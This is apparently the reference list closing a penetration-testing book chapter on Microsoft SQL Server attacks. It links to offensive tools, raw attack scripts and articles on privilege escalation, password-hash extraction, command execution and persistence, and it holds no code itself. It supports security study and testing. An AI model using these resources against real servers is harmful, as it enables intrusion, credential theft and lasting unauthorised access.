<li>SQL Server 2022 new fixed server-level <span class="No-Break">roles: </span><a href="https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver16"><span class="No-Break">https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver16</span></a></li>
<li>Pre-SQL Server 2022 fixed server-level <span class="No-Break">roles: </span><a href="https://www.mssqltips.com/sqlservertip/1887/understanding-sql-server-fixed-server-roles/"><span class="No-Break">https://www.mssqltips.com/sqlservertip/1887/understanding-sql-server-fixed-server-roles/</span></a></li>
<li>SQLRecon <span class="No-Break">tool: </span><a href="https://github.com/skahwah/SQLRecon"><span class="No-Break">https://github.com/skahwah/SQLRecon</span></a></li>
<li>PowerUpSQL <span class="No-Break">tool: </span><a href="https://github.com/NetSPI/PowerUpSQL"><span class="No-Break">https://github.com/NetSPI/PowerUpSQL</span></a></li>
<li>PowerUpSQL Cheat <span class="No-Break">Sheet: </span><a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet"><span class="No-Break">https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet</span></a></li>
<li>HeidiSQL <span class="No-Break">tool: </span><span class="No-Break">https://www.heidisql.com/</span></li>
<li>MS SQL Server <span class="No-Break">enumeration: </span><span class="No-Break">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#common-enumeration</span></li>
<li>MS SQL Server enumeration <span class="No-Break">2: </span><span class="No-Break">https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/mssql#enumeration</span></li>
<li>User <span class="No-Break">impersonation: </span><span class="No-Break">https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/</span></li>
<li>Attacking (un)trustworthy <span class="No-Break">databases: </span><span class="No-Break">https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/</span></li>
<li>Escalating from a <strong class="source-inline">db_owner</strong> <span class="No-Break">script: </span><span class="No-Break">https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1</span></li>
<li>MS SQL <span class="No-Break">Coerce: </span><span class="No-Break">https://github.com/p0dalirius/MSSQL-Analysis-Coerce</span></li>
<li><span class="No-Break">JuicyPotato: </span><span class="No-Break">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato</span></li>
<li>RoguePotato, PrintSpoofer, SharpEfsPotato, and <span class="No-Break">GodPotato: </span><span class="No-Break">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer</span></li>
<li>Obtaining SQL Server <strong class="source-inline">sysadmin</strong> privileges from a local <span class="No-Break">administrator: </span><span class="No-Break">https://www.netspi.com/blog/technical/network-penetration-testing/get-sql-server-sysadmin-privileges-local-admin-powerupsql/</span></li>
<li>Extracting SQL Server hashes from a <strong class="source-inline">master.mdf</strong> <span class="No-Break">file: </span><span class="No-Break">https://xpnsec.tumblr.com/post/145350063196/reading-mdf-hashes-with-powershell</span></li>
<li><span class="No-Break"><strong class="source-inline">Invoke-MDFHashes</strong></span><span class="No-Break">: </span><span class="No-Break">https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes</span></li>
<li>Custom extended stored procedure DLL <span class="No-Break">template: </span><span class="No-Break">https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp</span></li>
<li>SQL Server CLR <span class="No-Break">assemblies: </span><span class="No-Break">https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/</span></li>
<li>CLR strict <span class="No-Break">security: </span><span class="No-Break">https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/clr-strict-security?view=sql-server-ver16</span></li>
<li>SeeCLRly <span class="No-Break">tool: </span><span class="No-Break">https://github.com/sekirkity/SeeCLRly</span></li>
<li>Exploit OLE <span class="No-Break">Automation: </span><span class="No-Break">https://www.imperva.com/blog/how-to-exploit-sql-server-using-ole-automation/</span></li>
<li>Agent job command <span class="No-Break">execution: </span><span class="No-Break">https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution</span></li>
<li>External script <span class="No-Break">execution: </span><span class="No-Break">https://cheats.philkeeble.com/active-directory/mssql#external-scripts</span></li>
<li><em class="italic">Beyond xp_cmdshell</em> by<em class="italic"> </em><span class="No-Break"><em class="italic">nullbind</em></span><span class="No-Break">: </span><span class="No-Break">https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server</span></li>
<li>Decrypting linked server <span class="No-Break">passwords: </span><span class="No-Break">https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/</span></li>
<li>LDAP enumeration via <span class="No-Break">OpenQuery: </span><span class="No-Break">https://keramas.github.io/2020/03/28/mssql-ad-enumeration2.xhtml</span></li>
<li>Persistence via startup stored <span class="No-Break">procedures: </span><span class="No-Break">https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/</span></li>
<li><strong class="source-inline">Invoke-SqlServer-Persist-StartupSp</strong> <span class="No-Break">script: </span><span class="No-Break">https://github.com/NetSPI/PowerUpSQL/blob/master/scripts/pending/Invoke-SqlServer-Persist-StartupSp.psm1</span></li>
<li><span class="No-Break">Triggers: </span><span class="No-Break">https://learn.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql?view=sql-server-ver16</span></li>
<li>DDL event <span class="No-Break">groups: </span><span class="No-Break">https://learn.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups?view=sql-server-ver16</span></li>
<li>Persistence via <span class="No-Break">triggers: </span><span class="No-Break">https://www.netspi.com/blog/technical/network-penetration-testing/maintaining-persistence-via-sql-server-part-2-triggers/</span></li>
</ol>
</div>
</div></body></html>